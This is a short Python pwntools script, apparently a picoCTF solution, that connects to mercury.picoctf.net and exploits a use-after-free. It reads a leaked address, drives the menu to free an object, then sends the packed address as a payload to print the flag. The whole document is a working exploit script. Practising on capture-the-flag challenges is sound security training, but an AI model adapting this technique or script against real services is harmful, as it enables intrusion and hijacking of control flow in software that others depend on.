# Credits to @ZeroDayTea
from pwn import *

r = remote('mercury.picoctf.net', 4504)  # replace with your port

r.recvuntil("it\n")
r.sendline('s')
r.recvuntil("...")

payload = p32(int(r.recvline().strip(), 16))

r.recvuntil("it\n")
r.sendline('i')
r.recvuntil('?')
r.sendline('y')

r.recvuntil("it\n")
r.sendline('l')
r.recvline()
r.sendline(payload)

r.recvuntil(':\n')
print(r.recvline().strip().decode())
